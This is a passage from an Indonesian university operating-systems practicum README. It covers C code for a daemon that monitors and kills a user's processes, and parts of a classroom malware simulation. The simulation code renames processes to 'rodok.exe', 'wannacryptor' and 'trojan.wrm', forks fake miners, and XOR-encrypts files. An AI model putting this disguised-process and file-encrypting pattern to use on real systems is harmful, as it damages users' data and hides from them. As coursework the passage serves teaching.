            } else if (pid > 0) {
                miner_pids[i] = pid;
            } else {
                perror("fork");
            }
        }

        pause();
        exit(0);
    }
```
Dimana prosesnya sebagai berikut.
- Program akan membaut proses ```pid_t```.
- Mengubah nama proses menjadi ```"rodok.exe"```.
- Fungsi for loop digunakan untuk membuat 4 kali fork.
- Setelah fork dibuat, maka nama proses diubah menjadi ```mine-crafer-%d```, dengan ```%d``` adalah angka dari 0 sampai 3.


Selanjutnya, fungsi anak fitur pertama dan kedua dijalankan. Untuk kodenya seperti ini

```
    pid_t pid_wannacryptor = fork();
    if (pid_wannacryptor == 0) {
        strcpy(__progname, "wannacryptor");
        prctl(PR_SET_NAME, __progname);

        // signal(SIGINT, handle_sigint);
        if (is_directory(TARGET_DIR)) {
            wannacryptor_repeat();
        }

        exit(0);
    }
    // menjalankan trojan.wrm
    pid_t pid_trojan = fork();
    if (pid_trojan == 0) {
        strcpy(__progname, "trojan.wrm");
        prctl(PR_SET_NAME, __progname);

        // signal(SIGINT, handle_sigint);

        trojan_repeat();
        exit(0);
    }

    while (1) {
        sleep(30);
    }
```
Dimana proses berjalannya sebagai berikut.
- Program membuat ```pid_t``` untuk membuat proses.
- Nama proses diubah menjadi nama yang diinginkan.
- Fungsi akan dipanggil untuk menjalankan proses.
- Setelah itu, program exit dengan ```exit 0```.
- Fungsi while diperlukan agar proses dapat berjalan secara daemon.

### h) Output

Untuk output dari anak fitur kedua seperti ini
(direktori ```/home/```)
![Image](https://github.com/user-attachments/assets/8948c0ad-6b89-40af-aeb2-d512e266f122)

(direktori ```/home/public/```)
![Image](https://github.com/user-attachments/assets/74cc2719-212a-42d5-b077-5673493489e2)

Lalu untuk output ```miner.log``` seperti ini
![Image](https://github.com/user-attachments/assets/8ce410b7-263e-4491-bde8-b2775a72d4d2)

Lalu output dari ```ps axjf``` seperti ini

![Image](https://github.com/user-attachments/assets/5fe04b45-bed8-4f2e-b63d-af3f387c2d98)

  <h2 id="soal4">Soal4</h2>

<p>
  Pada soal ini kita diminta untuk membuat sebuah program dalam bahasa c yang memiliki beberapa fitur yaitu: <br>
  A. list program yang sedang berjalan pada komputer user. <br>
  B. Daemon untuk meencatat log program yang sedang berjalan. <br>
  C. Fitur untuk mematikan daemon sebelumnya. <br>
  D. Program untuk menggagalkan semua proses yang sedang berjalan dan menulis status proses ke dalam file log dengan status FAILED. <br>
  E. Fitur untuk mengembalikan komputer seperti awal. <br>
  F. Mencatat semua aktivitas di file log.
</p>

<h3>4A.</h3>

```
void list_processes(const char *username) {
    DIR *proc = opendir("/proc");
    if (!proc) {
        perror("opendir /proc");
        exit(EXIT_FAILURE);
    }

    uid_t uid = get_uid(username);
    struct dirent *entry;
    long ticks_per_sec = sysconf(_SC_CLK_TCK);

    while ((entry = readdir(proc)) != NULL) {
        if (!isdigit(entry->d_name[0])) continue;

        char path[256], name[100] = "";
        uid_t proc_uid = -1;
        unsigned long vsize = 0; // for RAM
        long utime = 0, stime = 0, total_time = 0; // for CPU

        // --- Ambil UID dan Nama Proses ---
        snprintf(path, sizeof(path), "/proc/%s/status", entry->d_name);
        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "Name:", 5) == 0)
                sscanf(line, "Name:\t%99s", name);
            if (strncmp(line, "Uid:", 4) == 0)
                sscanf(line, "Uid:\t%d", &proc_uid);
            if (strncmp(line, "VmRSS:", 6) == 0)
                sscanf(line, "VmRSS:\t%lu", &vsize); // dalam KB
        }
        fclose(fp);

        if (proc_uid != uid) continue;

        // --- Ambil waktu CPU ---
        snprintf(path, sizeof(path), "/proc/%s/stat", entry->d_name);
        fp = fopen(path, "r");
        if (!fp) continue;

        // /proc/[pid]/stat memiliki banyak field, kita ambil field ke-14 dan ke-15 (utime dan stime)
        // Format: pid (comm) state ppid ... utime stime ...
        // Kita perlu melewati tanda kurung dulu
        int dummy;
        char comm[256], state;
        fscanf(fp, "%d %s %c", &dummy, comm, &state);
        for (int i = 0; i < 11; i++) fscanf(fp, "%*s"); // skip sampai ke utime

        fscanf(fp, "%ld %ld", &utime, &stime);
        fclose(fp);
        total_time = utime + stime;

        double cpu_usage = (double)total_time / ticks_per_sec;

        printf("PID: %s | Cmd: %-15s | RAM: %5lu KB | CPU: %.2f s\n",
               entry->d_name, name, vsize, cpu_usage);
    }

    closedir(proc);
}
```
<p>Fungsi list_processes(const char *username) ini digunakan untuk menampilkan daftar proses milik user tertentu, lengkap dengan informasi seperti PID, nama proses, penggunaan RAM, dan waktu CPU.</p>
<p>Direktori /proc berisi subdirektori untuk setiap proses yang sedang berjalan, dengan nama berupa angka PID.</p>
<p>Fungsi get_uid() adalah fungsi buatan yang mengembalikan UID (User ID) dari nama pengguna.
Ini digunakan untuk menyaring hanya proses milik user tersebut.</p>

```c
while ((entry = readdir(proc)) != NULL) {
    if (!isdigit(entry->d_name[0])) continue;
snprintf(path, sizeof(path), "/proc/%s/status", entry->d_name);
```
<p>Pada bagian ini program akan meLooping setiap entri di /proc dan Hanya entri yang nama filenya angka (artinya PID) yang diproses, serta memprint outputnya.</p>

```c
snprintf(path, sizeof(path), "/proc/%s/stat", entry->d_name);
fscanf(fp, "%d %s %c", &dummy, comm, &state);
// Skip sampai field ke-14
for (int i = 0; i < 11; i++) fscanf(fp, "%*s");
fscanf(fp, "%ld %ld", &utime, &stime);
double cpu_usage = (double)total_time / ticks_per_sec;
```
<p> Pada bagain ini program akan mengambil informasi menngenai CPU melalui Field ke-14 (utime) dan ke-15 (stime) yang mana itu adalah waktu CPU dalam clock ticks.
Keduanya dijumlahkan menjadi total_time.</p>

```c
printf("PID: %s | Cmd: %-15s | RAM: %5lu KB | CPU: %.2f s\n",
       entry->d_name, name, vsize, cpu_usage);
```
<p>Print keseluruhan informasi.<br>
nanti hasil outputnya seperti ini
</p>
<img src="https://github.com/user-attachments/assets/dd05aa1b-4c1b-4c6e-b021-b019ecbc0eab">


<h3>4B.</h3>

```c
void run_daemon(const char *username) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) {
        printf("Debugmon daemon started (PID: %d)\n", pid);
        FILE *f = fopen(PID_FILE, "w");
        if (f) {
            fprintf(f, "%d", pid);
            fclose(f);
        }
        exit(0);
    }

    setsid(); // detach from terminal

    uid_t uid = get_uid(username);

    while (1) {
        DIR *proc = opendir("/proc");
        if (!proc) continue;

        struct dirent *entry;
        while ((entry = readdir(proc)) != NULL) {
            if (!isdigit(entry->d_name[0])) continue;

            char path[256], name[100] = "";
            uid_t proc_uid = -1;
            snprintf(path, sizeof(path), "/proc/%s/status", entry->d_name);

            FILE *fp = fopen(path, "r");
            if (!fp) continue;

            char line[256];
            while (fgets(line, sizeof(line), fp)) {
                if (strncmp(line, "Name:", 5) == 0)
                    sscanf(line, "Name:\t%99s", name);
                if (strncmp(line, "Uid:", 4) == 0) {
                    sscanf(line, "Uid:\t%d", &proc_uid);
                    break;
                }
            }
            fclose(fp);

            if (proc_uid == uid) {
                write_log(name, "RUNNING");
            }
        }

        closedir(proc);
        sleep(5);
    }
}
```
<p>Fungsi ini menjalankan daemon bernama "Debugmon", yang bertugas memantau proses milik user tertentu dan mencatatnya ke log jika sedang berjalan.</p>

```c
pid_t pid = fork();
if (pid < 0) exit(EXIT_FAILURE);         // Jika gagal fork, keluar dengan error
if (pid > 0) {
    printf("Debugmon daemon started (PID: %d)\n", pid);
    FILE *f = fopen(PID_FILE, "w");      // Simpan PID child ke file PID_FILE
    if (f) {
        fprintf(f, "%d", pid);
        fclose(f);
    }
    exit(0);                             // Proses parent keluar
}
```

<p>Fungsi fork() memisahkan proses menjadi parent dan child.
Parent mencetak PID dan menyimpan ke file, lalu keluar.
Child lanjut berjalan sebagai daemon. </p>

```c
while (1) {
    DIR *proc = opendir("/proc");
    if (!proc) continue;
while ((entry = readdir(proc)) != NULL) {
    if (!isdigit(entry->d_name[0])) continue;
```

<p>Pada bagian ini program akan embuka direktori /proc yang berisi info semua proses di sistem Linux.
Jika gagal buka, lanjut ke iterasi berikutnya.
Setelah itu program akan mengiterasi Proses dalam /proc.</p>

```c
char path[256], name[100] = "";
uid_t proc_uid = -1;
snprintf(path, sizeof(path), "/proc/%s/status", entry->d_name);

FILE *fp = fopen(path, "r");
if (!fp) continue;

char line[256];
while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "Name:", 5) == 0)
        sscanf(line, "Name:\t%99s", name);
    if (strncmp(line, "Uid:", 4) == 0) {
        sscanf(line, "Uid:\t%d", &proc_uid);
        break;
    }
}
fclose(fp);
```
<p>Pada bagian ini program akan membuka file /proc/<pid>/status untuk baca informasi proses, lalu mengambil informasi <br>
Name: nama program/proses. <br>
Uid: UID dari pemilik proses.</p>

<h3>4C.</h3>

<p>Pada soal ini kita membuat sebuah fitur untuk menghentikan proses log yang sedang berjalan pada komputer dengan cara mematikan daemonnya</p>

```c
void stop_daemon() {
    FILE *f = fopen(PID_FILE, "r");
    if (!f) {
        printf("No daemon is running.\n");
        return;
    }
    int pid;
    fscanf(f, "%d", &pid);
    fclose(f);
    kill(pid, SIGTERM);
    unlink(PID_FILE);
    printf("Daemon stopped.\n");
}
```
<p> Mendefinisikan fungsi bernama stop_daemon yang tidak menerima parameter dan tidak mengembalikan nilai (void).
Fungsi ini bertugas menghentikan proses daemon yang sedang berjalan.
</p>
<p>
  Membuka file yang menyimpan PID (Process ID) dari proses daemon.
PID_FILE adalah macro atau konstanta yang menunjuk ke nama file tempat menyimpan PID, misalnya "daemon.pid".
Dibuka dengan mode "r" artinya read only — hanya untuk membaca file.
</p>

<p>
  fscanf(f, "%d", &pid); membaca integer dari file (PID proses daemon) dan menyimpannya ke variabel pid.
fclose(f); menutup file setelah selesai dibaca.
</p>

<p>
  Mengirim sinyal SIGTERM ke proses dengan ID pid.
  Menghapus file PID_FILE dari sistem file.
Ini untuk menandakan bahwa daemon sudah dihentikan dan tidak ada proses yang berjalan.
</p>

<h3>4D</h3>
<p>
  pada soal ini kami membuat fitur untuk menggagalkan semua proses yang sedang berjalan di suatu user  lalu akan ada status FAILED di file log saat fitur ini berjalan.
</p>

```c
void fail_user(const char *username) {
    uid_t uid = get_uid(username);
    FILE *flag = fopen(FAIL_FLAG, "w");
    if (flag) fclose(flag);

    DIR *proc = opendir("/proc");
    if (!proc) return;

    struct dirent *entry;
    while ((entry = readdir(proc)) != NULL) {
        if (!isdigit(entry->d_name[0])) continue;

        char path[256], name[100] = "";
        uid_t proc_uid = -1;
        snprintf(path, sizeof(path), "/proc/%s/status", entry->d_name);

        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "Name:", 5) == 0)
                sscanf(line, "Name:\t%99s", name);
            if (strncmp(line, "Uid:", 4) == 0) {
                sscanf(line, "Uid:\t%d", &proc_uid);
                break;
            }
        }
        fclose(fp);

        if (proc_uid == uid) {
            int pid = atoi(entry->d_name);
            kill(pid, SIGKILL);
            write_log(name, "FAILED");
        }
    }

    closedir(proc);
    printf("All processes of %s terminated.\n", username);
}
```

Fungsi ini bertugas:
Memberi tanda kegagalan (flag) pada sistem,
Mematikan semua proses milik user tertentu (username),
Mencatat proses yang dihentikan.

cara kerjanya adalah:
1.Ambil UID dari username. <br>
2.Buat file tanda kegagalan (FAIL_FLAG).<br>
3.Scan seluruh proses yang berjalan lewat /proc.<br>
4.Buka /proc/[PID]/status, ambil UID dan nama proses.<br>
5.Jika proses milik user tersebut → kirim sinyal SIGKILL, catat dalam log.<br>
6.Ulangi sampai semua proses user tersebut dimatikan.<br>
7.Tutup /proc dan cetak ringkasan.<br>
<h2 id="Revisi">Revisi</h2>

<h3>4E</h3>

Pada soal kali ini kami membuat fitur untuk mengembalikan keadaan laptop seperti awal (mematikan fitur 4D), agar semua proses dapat kembali running dengan lancar.

```c
void revert_user(const char *username) {
    unlink(FAIL_FLAG);
    printf("User %s can run processes again.\n", username);
}
```
<P>
  unlink() adalah fungsi untuk menghapus file dari filesystem (mirip remove()).
</P>

<p>
  Jika sebelumnya fail_user(username):
<br>
Membuat file FAIL_FLAG,
<br>
Mematikan semua proses user,
<br>
Menandai status user sebagai gagal.
<br>
Maka revert_user(username):
<br>
Menghapus flag kegagalan,
<br>
Memberi kesempatan user untuk aktif kembali.
</p>

<h3> 4F </h3>
Pada soal ini kami membuat file log untuk semua aktifitas yang berjalan dan juga log ini berjalan.

dan format nya adalah [dd:mm:yyyy]-[hh:mm:ss]_nama-process_STATUS(RUNNING/FAILED).


![Image](https://github.com/user-attachments/assets/8aa1c931-e44c-494b-857c-8725ba1dd495)


<h2>REVISI</h2>
<h3>Soal 1</h3>
Pada soal 1, ada kesalahan dimana ketika seharusnya ketika menggunakan command ```./action -m Combine```, selutuh isi dari folder ```Filtered``` dihapus. 
Untuk kode sebelumnya seperti ini (isi folder Fitered belum dihapus)

![Image](https://github.com/user-attachments/assets/1a7e2ca4-f4f2-4859-8da1-4a8cb116658a)

Untuk kode setelahnya seperti ini (isi folder Fitered sudah dihapus)

![Image](https://github.com/user-attachments/assets/21ff6df1-a9a7-4bbe-89f4-ba95eb883eda)

<h3>Soal 3</h3>
Untuk soal 3, ada masalah dimana seharusnya ketika program dijalankan, maka terminal langsung ke shell input. Namun, kesalahan terjadi ketika program dijalankan, maka terminal belum menutup (tidak langsung ke shell input). Cara mengatasinya adalah dengan menghilangkan kode di bawah ini

```
    while (1) {
        // menjaga agar parent tidak exit, supaya anak-anaknya tidak jadi defunct
        sleep(30);
    }
```

Untuk tampilannya seperti ini

https://github.com/user-attachments/assets/1e5e91ea-ab00-4c87-a189-bb79a5a42ecb

Selanjutnya, ada keasalahan pada enskripsi. Hal ini dapat diatasi dengan mengganti kode yang sebelumnya seperti ini

```
void encrypt_file(const char *filepath) {
    ...
    unsigned char buffer[BUFFER_SIZE];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, fp)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            buffer[i] ^= (unsigned char)(xor_key & 0xFF);
        }
        fwrite(buffer, 1, bytesRead, fp_out);
    }
    ...
}
```
Menjadi seperti ini
```
void encrypt_file(const char *filepath) {
    while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, fp)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            buffer[i] ^= KEY;
        }
        fwrite(buffer, 1, bytesRead, fp_out);
        offset += bytesRead;
    }
```
Untuk outputnya seperti ini

Sebelum
![Image](https://github.com/user-attachments/assets/348f8772-3fbf-440a-9ed7-bfc53c4eac0d)

Sesudah
![Image](https://github.com/user-attachments/assets/b19fb018-4f88-4457-ba89-c4fec2d8724b)

<h3>Soal 4</h3>
Untuk soal 4, ada satu revisi yaitu format log yang belum sesuai.

![Image](https://github.com/user-attachments/assets/813607e5-3061-4cd2-914f-1b2defda5a13)

ini adalah hasil format yang telah diperbarui dan di sesuaikan.
